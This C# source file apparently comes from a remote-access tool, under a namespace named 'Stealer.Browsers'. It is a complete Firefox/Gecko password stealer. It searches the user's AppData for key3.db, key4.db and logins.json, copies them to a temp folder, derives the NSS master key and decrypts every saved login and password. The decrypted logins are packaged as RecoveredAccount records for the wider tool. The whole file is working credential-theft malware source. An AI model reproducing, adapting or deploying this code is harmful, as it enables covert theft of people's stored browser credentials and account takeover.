using FKRemoteDesktop.Helpers;
using FKRemoteDesktop.Message.MessageStructs;
using FKRemoteDesktop.Stealer.Helper;
using FKRemoteDesktop.Utilities;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Stealer.Browsers
{
    public class MozillaPasswordReader : IAccountReader
    {
        public string ApplicationName => "Mozilla";
        public string KeyName => "Password";
        public List<string> _geckoBrowsers = new List<string>();
        public List<string> _credential = new List<string>();

        public static readonly string RoamingAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");
        public static readonly string LocalAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");
        public static readonly string TempDirectory = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp");

        private List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
        {
            List<string> list = new List<string>();
            if (files == null || files.Length == 0 || level > maxLevel)
            {
                return list;
            }
            try
            {
                string[] directories = Directory.GetDirectories(baseDirectory);
                foreach (string path in directories)
                {
                    try
                    {
                        DirectoryInfo directoryInfo = new DirectoryInfo(path);
                        FileInfo[] files2 = directoryInfo.GetFiles();
                        bool flag = false;
                        for (int j = 0; j < files2.Length; j++)
                        {
                            if (flag)
                            {
                                break;
                            }
                            for (int k = 0; k < files.Length; k++)
                            {
                                if (flag)
                                {
                                    break;
                                }
                                string a = files[k];
                                FileInfo fileInfo = files2[j];
                                if (a == fileInfo.Name)
                                {
                                    flag = true;
                                    list.Add(fileInfo.FullName);
                                }
                            }
                        }
                        foreach (string item in FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
                        {
                            if (!list.Contains(item))
                            {
                                list.Add(item);
                            }
                        }
                        directoryInfo = null;
                    }
                    catch
                    {
                    }
                }
                return list;
            }
            catch
            {
                return list;
            }
        }

        private string Prbn(string profilesDirectory)
        {
            string text = string.Empty;
            try
            {
                string[] array = profilesDirectory.Split(new string[1]
                {
                    "AppData\\Roaming\\"
                }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
                {
                    '\\'
                }, StringSplitOptions.RemoveEmptyEntries);
                text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
            }
            catch (Exception) { }
            return text.Replace(" ", string.Empty);
        }

        private string Plbn(string profilesDirectory)
        {
            string text = string.Empty;
            try
            {
                string[] array = profilesDirectory.Split(new string[1]
                {
                    "AppData\\Local\\"
                }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
                {
                    '\\'
                }, StringSplitOptions.RemoveEmptyEntries);
                text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
            }
            catch (Exception) { }
            return text.Replace(" ", string.Empty);
        }

        private string GetProfileName(string path)
        {
            try
            {
                string[] array = path.Split(new char[1]
                {
                    '\\'
                }, StringSplitOptions.RemoveEmptyEntries);
                return array[array.Length - 1];
            }
            catch { }
            return "Unknown";
        }

        private string CreateTempCopy(string filePath)
        {
            string text = CreateTempPath();
            File.Copy(filePath, text, overwrite: true);
            return text;
        }

        private string CreateTempPath()
        {
            return Path.Combine(TempDirectory, "tempDataBase" +
                DateTime.Now.ToString("O").Replace(':', '_') +
                Thread.CurrentThread.GetHashCode() +
                Thread.CurrentThread.ManagedThreadId);
        }

        private void Lopos(string profile, byte[] privateKey, string browser_name, string profile_name)
        {
            try
            {
                string path = CreateTempCopy(Path.Combine(profile, "logins.json"));
                if (File.Exists(path))
                {
                    foreach (JsonValue item in (IEnumerable)File.ReadAllText(path).FromJSON()["logins"])
                    {
                        GeckoCore.GeckoInfo Gecko4 = GeckoCore.Create(Convert.FromBase64String(item["encryptedUsername"].ToString(saving: false)));
                        GeckoCore.GeckoInfo Gecko42 = GeckoCore.Create(Convert.FromBase64String(item["encryptedPassword"].ToString(saving: false)));
                        string text = Regex.Replace(GeckoCore.lTRjlt(privateKey, Gecko4.Objects[0].Objects[1].Objects[1].ObjectData, Gecko4.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
                        string text2 = Regex.Replace(GeckoCore.lTRjlt(privateKey, Gecko42.Objects[0].Objects[1].Objects[1].ObjectData, Gecko42.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
                        _credential.Add("URL : " + item["hostname"] + System.Environment.NewLine + "Login: " + text + System.Environment.NewLine + "Password: " + text2 + System.Environment.NewLine);
                        _geckoBrowsers.Add("URL : " + item["hostname"] + System.Environment.NewLine + "Login: " + text + System.Environment.NewLine + "Password: " + text2 + System.Environment.NewLine);
                    }
                    for (int i = 0; i < _credential.Count(); i++)
                    {
                        _geckoBrowsers.Add("Browser : " + browser_name + System.Environment.NewLine + "Profile : " + profile_name + System.Environment.NewLine + _credential[i]);
                    }
                    _credential.Clear();
                }
            }
            catch (Exception) { }
        }

        private byte[] p4k(string file)
        {
            byte[] result = new byte[24];
            try
            {
                if (!File.Exists(file))
                {
                    return result;
                }
                CNT cNT = new CNT(file);
                cNT.ReadTable("metaData");
                string s = cNT.ParseValue(0, "item1");
                string s2 = cNT.ParseValue(0, "item2)");
                GeckoCore.GeckoInfo geckoInfo = GeckoCore.Create(Encoding.Default.GetBytes(s2));
                byte[] objectData = geckoInfo.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
                byte[] objectData2 = geckoInfo.Objects[0].Objects[1].ObjectData;
                GeckoCore.GeckoAESInfo geckoAESInfo = new GeckoCore.GeckoAESInfo(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
                geckoAESInfo.Crypto();
                GeckoCore.lTRjlt(geckoAESInfo.DataKey, geckoAESInfo.DataIV, objectData2);
                cNT.ReadTable("nssPrivate");
                int rowLength = cNT.RowLength;
                string s3 = string.Empty;
                for (int i = 0; i < rowLength; i++)
                {
                    if (cNT.ParseValue(i, "a102") == Encoding.Default.GetString(GeckoCore.Key4MagicNumber))
                    {
                        s3 = cNT.ParseValue(i, "a11");
                        break;
                    }
                }
                GeckoCore.GeckoInfo geckoInfo2 = GeckoCore.Create(Encoding.Default.GetBytes(s3));
                objectData = geckoInfo2.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
                objectData2 = geckoInfo2.Objects[0].Objects[1].ObjectData;
                geckoAESInfo = new GeckoCore.GeckoAESInfo(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
                geckoAESInfo.Crypto();
                result = Encoding.Default.GetBytes(GeckoCore.lTRjlt(geckoAESInfo.DataKey, geckoAESInfo.DataIV, objectData2, PaddingMode.PKCS7));
                return result;
            }
            catch (Exception)
            {
                return result;
            }
        }

        public byte[] ConvertHexStringToByteArray(string hexString)
        {
            if (hexString.Length % 2 != 0)
            {
                throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "二进制密钥不可能是奇数位数字: {0}", hexString));
            }
            byte[] array = new byte[hexString.Length / 2];
            for (int i = 0; i < array.Length; i++)
            {
                string s = hexString.Substring(i * 2, 2);
                array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
            }
            return array;
        }

        private string vbv(GeckoCore.GeckoDBInfo berkeleyDB, Func<string, bool> predicate)
        {
            string text = string.Empty;
            try
            {
                foreach (KeyValuePair<string, string> key in berkeleyDB.Keys)
                {
                    if (predicate(key.Key))
                    {
                        text = key.Value;
                    }
                }
            }
            catch { }
            return text.Replace("-", string.Empty);
        }

        private byte[] p3k(string file)
        {
            byte[] array = new byte[24];
            try
            {
                if (!File.Exists(file))
                {
                    return array;
                }
                new DataTable();
                GeckoCore.GeckoDBInfo berkeleyDB = new GeckoCore.GeckoDBInfo(file);
                GeckoCore.GeckoCryptographyInfo geckoCryptoInfo = new GeckoCore.GeckoCryptographyInfo(vbv(berkeleyDB, (string x) => x.Equals("password-check")));
                string hexString = vbv(berkeleyDB, (string x) => x.Equals("global-salt"));
                GeckoCore.GeckoAESInfo geckoAESInfo = new GeckoCore.GeckoAESInfo(ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), ConvertHexStringToByteArray(geckoCryptoInfo.EntrySalt));
                geckoAESInfo.Crypto();
                GeckoCore.lTRjlt(geckoAESInfo.DataKey, geckoAESInfo.DataIV, ConvertHexStringToByteArray(geckoCryptoInfo.Passwordcheck));
                GeckoCore.GeckoInfo geckoInfo = GeckoCore.Create(ConvertHexStringToByteArray(vbv(berkeleyDB, (string x) => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt"))));
                GeckoCore.GeckoAESInfo geckoAESInfo2 = new GeckoCore.GeckoAESInfo(ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), geckoInfo.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
                geckoAESInfo2.Crypto();
                GeckoCore.GeckoInfo geckoInfo2 = GeckoCore.Create(GeckoCore.Create(Encoding.Default.GetBytes(GeckoCore.lTRjlt(geckoAESInfo2.DataKey, geckoAESInfo2.DataIV, geckoInfo.Objects[0].Objects[1].ObjectData))).Objects[0].Objects[2].ObjectData);
                if (geckoInfo2.Objects[0].Objects[3].ObjectData.Length <= 24)
                {
                    array = geckoInfo2.Objects[0].Objects[3].ObjectData;
                    return array;
                }
                Array.Copy(geckoInfo2.Objects[0].Objects[3].ObjectData, geckoInfo2.Objects[0].Objects[3].ObjectData.Length - 24, array, 0, 24);
                return array;
            }
            catch (Exception)
            {
                return array;
            }
        }

        private void Creds(string profile, string browser_name, string profile_name)
        {
            try
            {
                if (File.Exists(Path.Combine(profile, "key3.db")))
                {
                    Lopos(profile, p3k(CreateTempCopy(Path.Combine(profile, "key3.db"))), browser_name, profile_name);
                }
                Lopos(profile, p4k(CreateTempCopy(Path.Combine(profile, "key4.db"))), browser_name, profile_name);
            }
            catch (Exception) { }
        }

        public IEnumerable<RecoveredAccount> ReadAccounts()
        {
            List<RecoveredAccount> result = new List<RecoveredAccount>();
            try
            {
                List<string> listFile = new List<string>();
                listFile.AddRange(FindPaths(LocalAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
                listFile.AddRange(FindPaths(RoamingAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
                foreach (string item in listFile)
                {
                    string fullName = new FileInfo(item).Directory.FullName;
                    string text = item.Contains(RoamingAppData) ? Prbn(fullName) : Plbn(fullName);
                    string profile_name = GetProfileName(fullName);

                    Creds(fullName, text, profile_name);

                    string sDataInfo = "";
                    foreach (var browser in _geckoBrowsers)
                    {
                        sDataInfo += browser;
                    }
                    result.Add(new RecoveredAccount()
                    {
                        Username = "N/A",
                        Password = "N/A",
                        Url = sDataInfo,
                        KeyName = KeyName,
                        Application = ApplicationName
                    });
                }
            }
            catch (Exception ex)
            {
                result.Add(new RecoveredAccount()
                {
                    Username = "N/A",
                    Password = "N/A",
                    Url = "访问出错: " + ex.Message,
                    KeyName = KeyName,
                    Application = ApplicationName
                });
            }

            if (result.Count <= 0)
            {
                result.Add(new RecoveredAccount()
                {
                    Username = "N/A",
                    Password = "N/A",
                    Url = "N/A",
                    KeyName = KeyName,
                    Application = ApplicationName
                });
            }
            return result;
        }
    }
}